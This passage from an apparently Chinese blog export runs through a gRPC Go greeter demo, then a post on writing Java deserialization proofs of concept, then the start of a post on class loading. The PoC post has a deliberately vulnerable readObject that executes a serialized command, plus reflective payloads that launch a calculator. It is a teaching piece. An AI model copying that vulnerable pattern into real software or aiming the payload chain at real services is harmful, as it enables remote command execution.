<span class="keyword">if</span> err := s.Serve(lis); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;failed to serve: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@debian grpc-demo]<span class="comment"># go run greeter_server/main.go</span></span><br><span class="line"><span class="number">2022</span><span class="regexp">/06/</span><span class="number">10</span> <span class="number">19</span>:<span class="number">01</span>:<span class="number">52</span> server listening at [::]:<span class="number">50051</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-3-编写Client代码"><a href="#2-3-编写Client代码" class="headerlink" title="2.3 编写Client代码"></a>2.3 编写Client代码</h3><p>新建grpc-demo/greeter_client目录</p>
<ul>
<li><p>main.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Copyright 2015 gRPC authors.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment"> * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"> * You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Package main implements a client for Greeter service.</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/credentials/insecure&quot;</span></span><br><span class="line">	pb <span class="string">&quot;grpc-demo/helloworld&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	defaultName = <span class="string">&quot;world&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	addr = flag.String(<span class="string">&quot;addr&quot;</span>, <span class="string">&quot;localhost:50051&quot;</span>, <span class="string">&quot;the address to connect to&quot;</span>)</span><br><span class="line">	name = flag.String(<span class="string">&quot;name&quot;</span>, defaultName, <span class="string">&quot;Name to greet&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.Parse()</span><br><span class="line">	<span class="comment">// Set up a connection to the server.</span></span><br><span class="line">	conn, err := grpc.Dial(*addr, grpc.WithTransportCredentials(insecure.NewCredentials()))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;did not connect: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	c := pb.NewGreeterClient(conn)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Contact the server and print out its response.</span></span><br><span class="line">	ctx, cancel := context.WithTimeout(context.Background(), time.Second)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	r, err := c.SayHello(ctx, &amp;pb.HelloRequest&#123;Name: *name&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;could not greet: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Printf(<span class="string">&quot;Greeting: %s&quot;</span>, r.GetMessage())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@debian grpc-demo]# go <span class="builtin-name">run</span> greeter_client/main.go <span class="attribute">--name</span>=Alice</span><br><span class="line">2022/06/10 19:05:33 Greeting: Hello Alice</span><br></pre></td></tr></table></figure></li>
</ul>
<p>服务端收到了消息</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@debian grpc-demo]<span class="comment"># go run greeter_server/main.go</span></span><br><span class="line"><span class="number">2022</span><span class="regexp">/06/</span><span class="number">10</span> <span class="number">19</span>:<span class="number">01</span>:<span class="number">52</span> server listening at [::]:<span class="number">50051</span></span><br><span class="line"><span class="number">2022</span><span class="regexp">/06/</span><span class="number">10</span> <span class="number">19</span>:<span class="number">05</span>:<span class="number">33</span> Received: Alice</span><br></pre></td></tr></table></figure>





<h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h2><ul>
<li><a href="https://grpc.io/docs/languages/go/quickstart/">https://grpc.io/docs/languages/go/quickstart/</a></li>
<li><a href="https://www.liwenzhou.com/posts/Go/gRPC/">https://www.liwenzhou.com/posts/Go/gRPC/</a></li>
</ul>
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title>java漏洞POC编写</title>
    <url>/java%E6%BC%8F%E6%B4%9EPOC%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<blockquote>
<p>曲径通幽处，禅房花木深。</p>
</blockquote>
<p>java poc编写入门。</p>
<p>本文从最简单的使用Runtime执行命令，再通过反射执行命令，之后又在反序列场景执行命令，最后是反序列化和反射结合执行命令。</p>
<span id="more"></span>



<h2 id="1-最简单的执行命令"><a href="#1-最简单的执行命令" class="headerlink" title="1. 最简单的执行命令"></a>1. 最简单的执行命令</h2><p>目标：首先明确我们的最终目的是为了执行语句<code>Runtime.getRuntime().exec(&quot;open -a calculator&quot;);</code></p>
<ul>
<li>Runtime.getRuntime：获取一个Runtime的实例</li>
<li>exec()：调用实例的exec函数</li>
<li>“open -a calculator”: 执行的参数</li>
</ul>
<p>最简单的弹计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecRuntimeDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-反射改造"><a href="#2-反射改造" class="headerlink" title="2. 反射改造"></a>2. 反射改造</h2><p>因为最后是通过反射机制来进行漏洞利用的，</p>
<p>所以先进行反射改造</p>
<p>最简单的反射构造应该是如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1. 获取Runtime的Class对象</span></span><br><span class="line">        Class runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2. 通过Class对象调用exec方法</span></span><br><span class="line">        Method execMethod = runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">//Runtime runtime = new Runtime(); 不可以，Runtime类是单例模式。每个 Java 应用程序都有一个 </span></span><br><span class="line">       	<span class="comment">//Runtime类实例,通过getRuntime方法获取当前Runtime运行时对象的引用。</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3. 创建一个Runtime对象</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//4. 在方法对象中传入对象和参数执行方法</span></span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="3-序列化与反序列化"><a href="#3-序列化与反序列化" class="headerlink" title="3. 序列化与反序列化"></a>3. 序列化与反序列化</h2><p>编写一个存在漏洞的重写了readObject的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> serializable.Serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>客户端构造一个恶意类，传给服务端，服务端在反序列化时调用了重写的readObject方法，导致命令被执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeSerializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//客户端写入文件</span></span><br><span class="line">        VulnClass vulnClass = <span class="keyword">new</span> VulnClass();</span><br><span class="line">        vulnClass.cmd = <span class="string">&quot;open -a calculator&quot;</span>;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(vulnClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">        VulnClass vulnClass1 = (VulnClass) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="4-反序列化反射改造1"><a href="#4-反序列化反射改造1" class="headerlink" title="4. 反序列化反射改造1"></a>4. 反序列化反射改造1</h2><ol>
<li><p>客户端将payload序列化，传给服务端</p>
</li>
<li><p>服务端将其反序列化，通过反射执行payload</p>
</li>
</ol>
<p>需要说明的是，这里不是完全反射，需要在服务端传入Runtime类。</p>
<p>重写了readObject的漏洞程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnClass</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">vulnInvoke</span><span class="params">(Object input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>反序列化后通过反射执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeSerializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//客户端写入文件</span></span><br><span class="line">        VulnClass vulnClass = <span class="keyword">new</span> VulnClass(</span><br><span class="line">                <span class="string">&quot;Runtime.class&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(vulnClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">        VulnClass vulnClass1 = (VulnClass) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        vulnClass1.vulnInvoke(runtime);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="5-反序列化反射改造2"><a href="#5-反序列化反射改造2" class="headerlink" title="5. 反序列化反射改造2"></a>5. 反序列化反射改造2</h2><p>我们要进行完全反射的话，不能在服务端创建Runtime对象，那么我们需要反射出服务端的Runtime实例对象。</p>
<p>反射实例对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>那么完整payload就如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method runtimeMethod = runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        runtimeMethod.invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要知道getMethod(“getRuntime”)是因为java.lang.Runtime是单例模式，只能通过getRuntime方法获取对象。</p>
<p>将上诉poc改成一句就为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>本文从最简单的使用Runtime执行命令，再通过反射执行命令，之后又在反序列场景执行命令，最后是反序列化和反射结合执行命令。</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>java类加载机制与反射</title>
    <url>/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<p><font style="color:Gray; float:left">莫道不消魂，帘卷西风，人比黄花瘦。</font><br></p>
<p><font style="color:Gray; float:right">——《醉花阴》</font></p>
<br>



<p>Java类的加载、连接、初始化和反射。</p>
<span id="more"></span>

<h2 id="1-类的加载、连接和初始化"><a href="#1-类的加载、连接和初始化" class="headerlink" title="1. 类的加载、连接和初始化"></a>1. 类的加载、连接和初始化</h2><p>系统可能在第一次使用某个类时加载该类，也可能采用预加载机制来加载某个类。</p>
<h3 id="1-1-JVM和类"><a href="#1-1-JVM和类" class="headerlink" title="1.1 JVM和类"></a>1.1 JVM和类</h3><p>当调用java命令运行某个Java程序时，该命令将会启动一个Java虚拟机进程，不管该Java程序有多么复杂，该程序启动了多少个线程，它们都处于该Java虚拟机进程里。同一个JVM的所有线程、所有变量都处于同一个进程里，它们都使用该JVM进程的内存区。当系统出现以下几种情况时，JVM进程将被终止。</p>
<ul>
<li>程序运行到最后正常结束 </li>
<li>程序运行到使用System.exit()或Runtime.getRuntime().exit()代码处程序结束。</li>
<li>程序执行过程中遇到未捕获的异常或错误而结束。</li>
<li>程序所在平台强制结束了JVM进程。</li>
</ul>
<p>当Java程序运行结束时，JVM进程结束，该进程在内存中的状态将会丢失。</p>
<p>我们编写测试Demo来证明java程序与JVM的关系。</p>
<p><strong>测试程序: A.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义该类的类变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>类变量：独立于方法之外的变量，用 static 修饰。</em></p>
<p><strong>程序1：ATest1</strong></p>
<p>接下来定义一个类用来创建A类的实例，并访问A对象的类变量a。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ATest1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建A类的实例</span></span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="comment">// 让a实例的类变量a的值自加</span></span><br><span class="line">        a.a ++;</span><br><span class="line">        System.out.println(a.a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure>

<p><strong>程序2：ATest2</strong></p>
<p>新创建一个A类的实例，并访问A的类变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ATest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建A类的实例</span></span><br><span class="line">        A b = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="comment">// 输出b实例的类变量a的值</span></span><br><span class="line">        System.out.println(b.a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>

<p>结果为6的原因就是创建的两个类是不同的JVM，程序1修改的值并不适用于程序2，程序1运行结束后在内存中的状态就消失了，与程序2新启的JVM没有任何关系</p>
<h3 id="1-2-类的加载"><a href="#1-2-类的加载" class="headerlink" title="1.2 类的加载"></a>1.2 类的加载</h3><p>当程序主动使用某个类时，如果该类还未被加载到内存中，则系统会通过<u>加载、连接、初始化</u>三个步骤来对该类进行初始化。如果没有意外，JVM将会连续完成这三个步骤，所以<u>有时也把这三个步骤统称为类加载或类初始化</u>。</p>
<p><u>类加载指的是将类的class文件读入内存，并为之创建一个java.lang.Class对象</u>。也就是说，当程序中使用任何类时，系统都会为之创建一个java.lang.Class对象。这里可以看出类也是一种对象，就像《金刚经》里讲：凡所有相皆是虚妄。要用佛学来破除这些相，如果太专注于佛学本身也着相了，因为佛学本身也是相。</p>
<p>类的加载由类加载器完成，类加载器通常由JVM提供，这些类加载器也是所有程序运行的基础，<u>JVM提供的这些类加载器通常被称为系统类加载器</u>。除此之外，<u>开发者可以通过继承ClassLoader基类来创建自己的类加载器</u>。</p>
<p>通过使用不同的类加载器，可以从不同来源加载</p>
<ul>
<li>从本地文件系统加载class文件</li>
<li>从JAR包加载class文件，JVM可以从JAR文件中直接加载该class文件。</li>
<li>通过网络加载class文件</li>
<li>把一个java源文件动态编译，并执行加载。</li>
</ul>
<p>类加载器通常无须等到“首次使用”该类时才加载该类，java虚拟机规范允许系统预先加载某些类。</p>
<h3 id="1-3-类的连接"><a href="#1-3-类的连接" class="headerlink" title="1.3 类的连接"></a>1.3 类的连接</h3><p>当类被加载之后，系统为之生成一个对应的Class对象，接着将会进入连接阶段，连接阶段负责把类的二进制数据合并到JRE中。类连接又可分为如下三阶段。</p>
<p>1）验证：验证阶段用于检测被加载的类是否有正确的内部结构，并和其他类协调一致。</p>
<p>2）准备：类准备阶段则负责为类的类变量分配内存，并设置默认初始值。</p>
<p>3）解析：将类的二进制数据中的符号引用替换成直接引用</p>
<h3 id="1-4-类的初始化"><a href="#1-4-类的初始化" class="headerlink" title="1.4 类的初始化"></a>1.4 类的初始化</h3><p>在类的初始化阶段，<u>虚拟机负责对类进行初始化，主要就是对类变量进行初始化</u>。在Java类中对类变量指定初始化值有两种方式：</p>
<ol>
<li>声明类变量时指定初始值</li>
<li>使用静态初始化块为类变量指定初始化值。</li>
</ol>
<p>代码片段</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//声明变量a时指定初始值</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> b; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> c; <span class="comment">//未指定，默认初始值为0</span></span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//使用静态初始化块为变量b指定初始值</span></span><br><span class="line">        b = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>声明变量时指定初始值，静态初始化块都将被当成类的初始化语句，JVM会按这些语句在程序中的排列顺序依次执行它们，例如下面的类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//使用静态初始化块为变量b指定初始值</span></span><br><span class="line">        b = <span class="number">6</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明变量a时指定初始化值</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> b = <span class="number">9</span>; <span class="comment">//*1</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Tes.b); <span class="comment">//9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码先在静态初始化块中为b变量赋值，此时类变量的值为6；接着程序向下执行，执行到*1处这行代码也属于该类的初始化语句，所以程序再次为类变量赋值，也就是说，当类初始化结束后，该类变量b的值为9.</p>
<p>JVM初始化一个类包含如下几个步骤。</p>
<ol>
<li>假如这个类还没有被加载和连接，则程序先加载并连接该类。</li>
<li>假如该类的直接父类还没有被初始化，则先初始化其直接父类。</li>
<li>假如类中有初始化语句，则系统依次执行这些初始化语句。</li>
</ol>
<p>当执行第二个步骤时，系统对直接父类的初始化步骤也遵循此步骤1~3；如果该直接父类又没有直接父类，则系统再次重复…依次类推。所以JVM最先初始化的总是java.lang.Object类。当程序主动使用任何一个类时，系统会保证该类以及所有父类（包括直接父类和间接父类）都会被初始化。</p>
<h3 id="1-5-类的初始化时机"><a href="#1-5-类的初始化时机" class="headerlink" title="1.5 类的初始化时机"></a>1.5 类的初始化时机</h3><p>当java程序首次通过下面6种方式来使用某个类或者接口时，系统就会初始化该类或者接口。</p>
<ul>
